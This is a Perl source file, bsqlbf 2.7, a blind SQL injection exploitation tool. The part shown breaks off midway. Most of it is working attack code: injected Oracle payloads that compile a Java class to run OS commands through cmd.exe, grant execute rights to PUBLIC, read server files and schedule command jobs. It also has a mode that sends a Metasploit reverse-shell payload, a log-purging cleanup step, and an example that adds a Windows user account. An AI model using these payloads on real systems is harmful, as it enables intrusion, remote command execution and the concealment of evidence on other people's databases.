#!/usr/bin/env perl
# Blind SQL Injection POC. aramosf@514.es // http://www.514.es
#modified by sid//sid@notsosecure.com
# 
#
# TODO:
# [ ] Rip more code from others.
use LWP::Simple;
use LWP::UserAgent;
use Getopt::Long;
use IO::Handle;
use strict;
use threads;
use threads::shared;
use Time::HiRes qw( usleep);
use URI;

$| = 1;


###############################################################################
my $default_debug = 0;
my $default_length = 32;
my $default_method = "GET";
my $default_cmd = "ping 127.0.0.1";
my $default_file = "C:\\boot.ini";
my $default_stype=0;
my $default_time = 0;
my $version = "2.7";
my $default_useragent = "bsqlbf $version";
my $default_sql = "(select \@\@version)";
#my $cmdfile;
my $LOGFILE="cmd.txt";
my $line;
my $ip="";
my $port="";
my $err_count=0;
my $url_clean;
###############################################################################


$| = 1;

my ($args, $solution);
my (%vars, @varsb);
my ($lastvar, $lastval);
my ($scheme, $authority, $path, $query, $fragment);
my ($head, $tail, $high);
my $hits = 0; 
my $amatch = 0;
my ($ua,$req);
my $furl;

###############################################################################
# Define GetOpt:
my ($url, $type, $database, $sql, $time, $rtime, $match, $nomatch, $uagent, $debug);
my ($proxy, $proxy_user, $proxy_pass,$rproxy, $ruagent); 
my ($start, $length, $method, $cmd, $file, $stype, $cookie, $blind);
my ($help, $get);
my ($ascii, $binary);

my $options = GetOptions (
  'help!'            => \$help, 
  'url=s'            => \$url,
  'database=s'		 => \$database,
  'type=s'			 => \$type,	
  'get=s'            => \$get,
  'sql=s'            => \$sql,
  'blind=s'          => \$blind,
  'match=s'          => \$match,
  'nomatch=s'          => \$nomatch,
  'start=s'          => \$start,
  'length=s'         => \$length,
  'method=s'	     => \$method,
   'cmd=s'	         => \$cmd,
   'file=s'	         => \$file,
 'stype=s'	     => \$stype,
  'uagent=s'	     => \$uagent,
  'ruagent=s'	     => \$ruagent,
  'cookie=s'	     => \$cookie,
  'proxy=s'          => \$proxy,
  'proxy_user=s'     => \$proxy_user,
  'proxy_pass=s'     => \$proxy_pass,
  'rproxy=s'         => \$rproxy,
  'debug!'           => \$debug, 
  'binary!'           =>\$binary, 
  'ascii!'           => \$ascii, 
  'rtime=s'          => \$rtime, 
  'time=i'           => \$time ,
    'port=s'           => \$port, 
  'ip=s'           => \$ip 

  );

&help unless ($url);
&help if $help eq 1;

#########################################################################
# Default Options.
$uagent         ||= $default_useragent; 
$debug          ||= $default_debug; 
$length         ||= $default_length; 
$solution       ||= $start;
$method         ||= $default_method;
$cmd         ||= $default_cmd;
$file         ||= $default_file;
$stype        ||= $default_stype;
$sql            ||= $default_sql;
$time           ||= $default_time;

######################################################################

#function to make GET, POST requests from the url

#my $usage = "$0 method url cookies proxy\n";

#print $method;
my $method_gp ;
my $url_gp ;
my $cookies_gp;
my $proxy_gp ;

# get_from_post("http://host/script.pl?a=b&c=d", "cook1=2; foo=bar", "http://prox:8080")
#print get_or_post($method, $url, $cookies, $proxy);

sub get_or_post {
        my ($method_gp, $url_gp, $cookies_gp, $proxy_gp) = @_;
		my $uri = URI->new($url_gp);
        print Dumper $uri->query;

        my $req;
        if (($method_gp eq "GET")||($method_gp eq "get")) {
				$req = HTTP::Request->new(GET => $uri->scheme . "://" . $uri->host . ":" . $uri->port . $uri->path . "?" . $uri->query);
					} 

					elsif (($method_gp eq "POST")||($method_gp eq "post")) {
$req = HTTP::Request->new(POST=> $uri->scheme . "://" . $uri->host . ":" . $uri->port . $uri->path);
$req->content($uri->query);
        } 
		else {
                die "ERROR: unknown method: $method\n";
        }

        my $ua = LWP::UserAgent->new;
        # $ua->env_proxy; # allow usage of env var http_proxy=http://host:8080
        $ua->proxy(['http', 'https'], $proxy_gp) if defined($proxy_gp);
        $ua->default_header('Cookie' => $cookies_gp) if defined($cookies_gp);
		$ua->default_header('Content-Type' => 'application/x-www-form-urlencoded');
        my $res = $ua->request($req);
        return $res->as_string;
} 


##########################################################################
&createlwp();
&parseurl();
my $end=0;
if ( ! defined($blind)) {
		$lastvar = $varsb[$#varsb];
		$lastval = $vars{$lastvar};
} else {
		$lastvar = $blind;
		$lastval = $vars{$blind};
}

if (! defined($type)) {
	$type=0;
}

if ($type==3) {
	$database=3;
}
if ($type==4) {
	$database=3;
}
if (! defined($database)) {
       
print "\nWARNING: You did not specify any database, I am assuming you are after A Microsoft Product\n";
$database=0;
}

if (defined($cookie)) { &cookie() }
if (!$match && !$nomatch){
#print "wtf";
	print "\nTrying to find a match string...\n" if $debug == 1;
	$amatch = "1";
	$match = fmatch("$url"," AND 1=");
	if ($match eq "no vulnerable") 
		{ 
		print "\nNo vuln: 2nd..\n" if $debug ==1;
		$match = fmatch("$url"," AND 1='");
		#$head = "\"";
		#$tail = " AND 1=\"1";
	};
	if ($match eq "no vulnerable") { 
		print "Not vulnerable \n\n If you know its vulnerable supply the '-match' string\n";
		exit 0; 
	} 
}
&banner();
&httpintro();




############################ Type 6###########################################
	if($type==6)
	{
		
		
		print "--------------------------------\n";
		print "--------------------------------\n";
		print "Oracle O.S command execution\n";
		print "\nNOTE: Please provide the vulnerable parameter as the last parameter\n";
		print "\nThis will only work if your injection allows execution of SQL as SYS user\n";
		print "\nFor vulnerable versions check: http://www.securityfocus.com/bid/35685\n\n";
		print "\n\n\n--------------------------------\n\n\n";
		print "String to Match: ".$match."\n";
		$stype=0;
		
		#-----ora_cmd.pl--starts here
################################## S Type: 0########################################
		if ($stype==0) {
		
		print "You asked me to execute \"".$cmd."\" on remote box with stype:".$stype."\n";
		print "--------------------------------\n\n\n";

my $url_1 = $url." and ";
my $javalib="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','CCCCC') from dual) =0--";

my $javaperm="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','CCCCC') from dual) =0--";

my $cmd_exec_func="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''''''LinxUtil.runCMD(java.lang.String) return String''''''''; '''';END;'';END;--','CCCCC') from dual)=0--";

my $priv_check="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''select user from dual'';END;--','CCCCC') from dual)=0--";
my $cmd_exec_func_priv="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','CCCCC') from dual) =0--";


my $cmd_exec_func_unpriv="(select SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC(USER,'VALIDATE_GRP_OBJECTS_LOCAL(:canon_gname);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' drop function LinxRunCMD '''';END;'';END;--','CCCCC') from dual)=0--";
  
my $cmd_1=$cmd;
my $cmd_exec="(select sys.LinxRunCMD('cmd.exe /c". $cmd_1. "') from dual) is null--";

####checking if user has privileges to vulnerable function

print "Checking if we have privileges to execute function SYS.DBMS_REPCAT_RPC.VALIDATE_REMOTE_RC()...\n";
#print "--------------------------------\n";
my $url=$url_1.$priv_check;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: you don't seem to have the privileges or database is not vulnerable \n";
	print "-----------------------------------------------\n";
  } else {
	print "\n\n\n--------------------------------\n\n\n";
	print "Sit back....Let's exploit this...\n";
	print "--------------------------------\n";
	
# print $content; 
}


#####--------------------#####

print "Step 1. Creating Java Library...\n";
#print "--------------------------------\n";
my $url=$url_1.$javalib;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 1 occured !!!...did you provide me the URL in the format, i want?? \n";
	print "-----------------------------------------------\n";
  } else {
    print "NO errors encountered.....proceeding to step..2\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 2. granting java execute privileges...\n";
my $url=$url_1.$javaperm;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 2 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..3\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 3. creating funtion for command execution...\n";
my $url=$url_1.$cmd_exec_func;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
	print "ERROR at STAGE 3 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..4\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 4. making function executable by all users...\n";
my $url=$url_1.$cmd_exec_func_priv;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 4 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..5\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 5. RIGHT!!!, by now we should have a function sys.LinxRunCMD through which we can execute commands...\n";
print "--------------------------------\n";
print "You should be able to execute this function as:\nselect sys.LinxRunCMD('cmd.exe /c net user notsosecure n0ts3cur3 /add') from dual\n";
print "I will execute the command you told me to execute... you won't be able to see the output though :( \n";
my $url=$url_1.$cmd_exec;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 5 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "...You need to investigate buddy....\n";
  } else {
	print "-----------------------------------------------\n";
	print "SUCCESS: Your command executed on the box....:)\n";
	print "-----------------------------------------------\n";

  }	
#-----------------------
print "Step 6. Droping function sys.LinxRunCMD...\n";
my $url=$url_1.$cmd_exec_func_unpriv;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;

  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 6 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "!!!!WARNING:I have not been able to drop the function..!!!!!!\n";
	exit 0;
  } else {
	print "Function dropped..\n";
	exit 0;
}
  	}

}

####################### Type 6 stops here #########################################

########################Type 7 Starts here##########################################

	if($type==7)
	{
		
		
		print "\n--------------------------------\n";
		#print "--------------------------------\n";
		print "Oracle O.S command execution with SYS.KUPP\$PROC.CREATE_MASTER_PROCESS()... \n";
		print "NOTE: Please provide the vulnerable parameter as the last parameter\n";
		print "This will only work if your injection allows execution of SQL as DBA\n";
#		print "\nFor vulnerable versions check: http://www.securityfocus.com/bid/35685\n\n";
		#print "\n\n\n--------------------------------\n\n\n";
		print "String to Match: ".$match."\n";
#		$stype=0;
		
		#-----ora_cmd.pl--starts here
################################## S Type: 0########################################
#		if ($stype==0) {
		
		print "You asked me to execute \"".$cmd."\" on remote database host\n";
		print "--------------------------------\n";

my $url_1 = $url;
my $create_prog=" and (select SYS.KUPP\$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_program(''notsosecurex'',''EXECUTABLE'',''c:\\WINDOWS\\system32\\cmd.exe /c ".$cmd." '',0,TRUE);')from dual) is not null --";
my $priv_check=" and (select SYS.KUPP\$PROC.CREATE_MASTER_PROCESS('null') from dual) is not null --";
my $create_job="  and (select SYS.KUPP\$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.create_job(job_name=>''notsosecurexx'',program_name=>''notsosecurex'',start_date=>NULL,repeat_interval=>NULL,end_date=>NULL,enabled=>TRUE,auto_drop=>TRUE);')from dual) is not null-- ";
my $remove_job=" and (select SYS.KUPP\$PROC.CREATE_MASTER_PROCESS('DBMS_SCHEDULER.DROP_PROGRAM(''notsosecurex'');')FROM DUAL) is not null --";
#my $cmd_exec_func="";


#my $cmd_1=$cmd;
#my $cmd_exec="(select sys.LinxRunCMD('cmd.exe /c". $cmd_1. "') from dual) is null--";

####checking if user has privileges to vulnerable function

print "Checking if we have privileges to execute function SYS.KUPP\$PROC.CREATE_MASTER_PROCESS()...\n";
#print "--------------------------------\n";
my $url=$url_1.$line;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: you don't seem to have the privileges or database is not vulnerable \n";
	print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "Sit back.. we have the right Permissions :)\nLet's exploit this...\n";
	print "--------------------------------\n";
	
#############################reverse shell code goes here###################
##if $cmd="shell"

if($cmd eq "revshell")
{
#if (($ip eq "")|($port eq ""))
#{ print "ERROR: IP or port not supplied for reverse shell";
#exit 0;
#}

print "Reading file cmd.txt \n Uploading metasploit's payload\n";
open LOGFILE, "cmd.txt" or die("Could not open cmd file. Did you run generator.exe to generate cmd.txt\n");
foreach $line (<LOGFILE>) {
#print "line is: ".$line;   
my $url=$url_1.$line;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	#print "-----------------------------------------------\n";
    print "!!";
	$err_count=$err_count+1;
	#print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "..";
}
}

if ($err_count>0)
{ print "\n".$err_count." Error Occured, it may not work\n";

}
else{
print "\nYipee! Should have a session now!\nRemember to clean up the server after exiting the metasploit session, -cmd=cleanup\n";
exit 0;
}
}
##############################reverse shell code ends here###################
	
##########################clean up code#####################


if($cmd eq "cleanup")
{

$err_count=0;

$url_clean=" and (SELECT SYS.KUPP\$PROC.CREATE_MASTER_PROCESS('BEGIN dbms_lock.sleep(1);DBMS_SCHEDULER.drop_program(PROGRAM_NAME => ''BSQLBFPROG'');DBMS_SCHEDULER.PURGE_LOG;END;') from dual) is not null--";   
my $url=$url_1.$url_clean;


my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	#print "-----------------------------------------------\n";
    print "!!";
	$err_count=$err_count+1;
	#print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "..";
}


if ($err_count>0)
{ print "\n".$err_count." Error Occured!";

}
else{
print "System cleaned";
exit 0;
}
}



####################clean up code ends##########################	
	
	
	
# print $content; 

print "Step1. Creating Program with DBMS_SCHEDULER\n";
my $url=$url_1.$create_prog;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: Something is not quite right, i will still continue to 2nd step \n";
	print "-----------------------------------------------\n";
  } else {
	print "..Program Created..\n";
	print "--------------------------------\n";
  }


print "Step2. Creating JOB with DBMS_SCHEDULER\n";
my $url=$url_1.$create_job;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: Unable to create job, i will still continue to 3rd step \n";
	print "-----------------------------------------------\n";
  } else {
	#print "\n\n\n--------------------------------\n\n\n";
	print "..Job Created Created.\n. your command should have been executed by now \n";
	print "Sleeping for 10 seconds \n";
	print "\n--------------------------------\n";
	sleep(10);
  }

print "Step3. Removing JOB (Clean-up)\n";
my $url=$url_1.$remove_job;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: Unable to Remove job\n";
	print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "..Job Removed..\n";
	print "--------------------------------\n";
die "Enjoy!";
#	sleep(10);
  }


  }}







#####--------type 7 stops here------------#####





######--type 8 starts here-----------------#######

	if($type==8)
	{
		
		
		print "\n--------------------------------\n";
		#print "--------------------------------\n";
		print "Oracle O.S command execution with DBMS_JAVA_TEST.FUNCALL... \n";
		print "NOTE: Please provide the vulnerable parameter as the last parameter\n";
		print "This will only work if the user has JAVA IO privileges\n";
#		print "\nFor vulnerable versions check: http://www.securityfocus.com/bid/35685\n\n";
		#print "\n\n\n--------------------------------\n\n\n";
		print "String to Match: ".$match."\n";
#		$stype=0;
		
		
		print "You asked me to execute \"".$cmd."\" on remote database host\n";
		print "--------------------------------\n";

my $url_1 = $url;
my $exec_java_cmd=" and (Select DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','c:\\\\windows\\\\system32\\\\cmd.exe','/c',' ". $cmd."') FROM DUAL) is null --";
my $priv_check="  and (select count(*) from user_java_policy where GRANTEE_NAME=user and type_name='java.io.FilePermission' and action ='execute') > 0 --";

print "Checking if we have Java IO Permissions...\n";
#print "--------------------------------\n";
my $url=$url_1.$priv_check;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR: you don't seem to have the privileges or database is not vulnerable \n";
	die "ending..";
	print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "Sit back.. we have the right Permissions :)\nLet's exploit this...\n";
	print "--------------------------------\n";

################revshell code###################
if($cmd eq "revshell")
{
#if (($ip eq "")|($port eq ""))
#{ print "ERROR: IP or port not supplied for reverse shell";
#exit 0;
#}

print "Reading file cmd.txt \n Uploading metasploit's payload\n";
open LOGFILE, "cmd.txt" or die("Could not open cmd file. Did you run generator.exe to generate cmd.txt\n");
foreach $line (<LOGFILE>) {
#print "line is: ".$line;   
my $url=$url_1.$line;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	#print "-----------------------------------------------\n";
    print "!!";
	$err_count=$err_count+1;
	#print "-----------------------------------------------\n";
  } else {
#	print "\n\n\n--------------------------------\n\n\n";
	print "..";
}
}

if ($err_count>1)
{ print "\n".$err_count." Error Occured, it may not work\n";
exit 0;
}
else{
print "\nYipee! Should have a session now!\n";
exit 0;
}
}

####################revshell code ends#################

	my $url=$url_1.$exec_java_cmd;
	my $content = get_or_post($method,$url,$cookie,$proxy);
	die "Couldn't get $url" unless defined $content;
	
	if(! ($content =~ m/($match)/i)) {
		die "Error Encountered \n";
		
	}
	else{
	die "Command executed Successfully \n";
	}
  
  
  }


	}
#######-type 8 stops here ------------------########







####################### Type 5 starts here #########################################

if ($type==5) 
{
#print $file;

$end =1;
$type=0;
$database=3;
$sql="select sys.LinxReadfile('".$file."') from dual";
print "\n\nType 5: Creates a function to read files..\n";
print "--------------------------------\n\n\n";

my $url_1 = $url." and ";
my $javalib="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $javaperm="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $cmd_exec_func="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxReadFile(filename in varchar2) return varchar2 as language java name ''''''''LinxUtil.readFile(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

my $cmd_exec_func_priv="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxReadFile to public'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";
my $cmd_exec_func_unpriv="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE '''' drop function LinxRunCMD '''';END;'';END;--','SYS',0,'1',0) from dual)is null--";
  
#my $cmd_1=$cmd;
#my $cmd_exec="(select sys.LinxRunCMD('cmd.exe /c". $cmd_1. "') from dual) is null--";

print "Step 1. Creating Java Library...\n";
#print "--------------------------------\n";
my $url=$url_1.$javalib;
#print $method;
#print $url;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 1 occured !!!...did you provide me the URL in the format, i want?? \n";
	print "-----------------------------------------------\n";
  } else {
    print "NO errors encountered.....proceeding to step..2\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 2. granting java execute privileges...\n";
my $url=$url_1.$javaperm;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 2 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..3\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 3. creating funtion for reading files...\n";
my $url=$url_1.$cmd_exec_func;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
	print "ERROR at STAGE 3 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
	print "I will proceed, however, there is a possibility that the attack will fail\n";
  } else {
    print "NO errors encountered.....proceeding to step..4\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
print "Step 4. making function executable by all users...\n";
my $url=$url_1.$cmd_exec_func_priv;
my $content = get_or_post($method,$url,$cookie,$proxy);
die "Couldn't get $url" unless defined $content;


  if(! ($content =~ m/($match)/i)) {
	print "-----------------------------------------------\n";
    print "ERROR at STAGE 4 occured !!!...something was not right.. \n";
	print "-----------------------------------------------\n";
#	print "I will proceed, however, there is a possibility that the attack will fail\n";
	exit 0;
  } else {
    print "NO errors encountered.......\n";
	print "SUCCESS: I have created the function sys.LinxReadFile()....\n";
	print "Now I will launch bsqlbf again to use this function and read the file you asked me to read....:)\n";
	print "--------------------------------\n";
	
# print $content; 
}

#-----------------------
#print "Step 5. RIGHT!!!, by now we should have a function sys.LinxRunCMD through which we can execute commands...\n";
#print "--------------------------------\n";
#print "You should be able to execute this function as:\nselect sys.LinxRunCMD('cmd.exe /c net user notsosecure n0ts3cur3 /add') from dual\n";
#print "I will execute the command you told me to execute... you won't be able to see the output though :( \n";
#my $url=$url_1.$cmd_exec;
#my $content = get_or_post($method,$url,$cookie,$proxy);
#die "Couldn't get $url" unless defined $content;
#
#
#  if(! ($content =~ m/($match)/i)) {
#	print "-----------------------------------------------\n";
#    print "ERROR at STAGE 5 occured !!!...something was not right.. \n";
#	print "-----------------------------------------------\n";
#	print "...You need to investigate buddy....\n";
#	exit 0;
#  } else {
#	print "-----------------------------------------------\n";
#	print "SUCCESS: I have created the function sys.LinxReadFile()....\n";
#	print "Now I will launch bsqlbf again to use this function and read the file you asked me to read....:)\n";
#	print "-----------------------------------------------\n";
#
#  }	
#-----------------------
#print "Step 6. Droping function sys.LinxRunCMD...\n";
#my $url=$url_1.$cmd_exec_func_unpriv;
#my $content = get_or_post($method,$url,$cookie,$proxy);
#die "Couldn't get $url" unless defined $content;
#
#  if(! ($content =~ m/($match)/i)) {
#	print "-----------------------------------------------\n";
#    print "ERROR at STAGE 6 occured !!!...something was not right.. \n";
#	print "-----------------------------------------------\n";
#	print "!!!!WARNING:I have not been able to drop the function..!!!!!!\n";
#	exit 0;
#  } else {
#	print "Function dropped..\n";
#	exit 0;
#}
  	










}

####################### Type 5 stops here #########################################


############################ Type 4###########################################
	if($type==4)
	{
		
		
		print "--------------------------------\n";
		print "Oracle O.S command execution\n";
		print "\n\n!!!!Note!!!!: Please provide the vulnerable parameter as the last parameter\n";
		print "Supported versions <=:\n(Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2, XE)\n\n";
		print "--------------------------------\n\n\n";
		print "String to Match: ".$match."\n";
		
		#-----ora_cmd.pl--starts here
################################## S Type: 0########################################
		if ($stype==0) {
		
		print "You asked me to execute \"".$cmd."\" on remote box with stype:".$stype."\n";
		print "--------------------------------\n\n\n";

my $url_1 = $url." and ";
my $javalib="(select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}public static String readFile(String filename){try{BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str %2b=stemp%2b\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'''';END;'';END;--','SYS',0,'1',0) from dual) is null--";

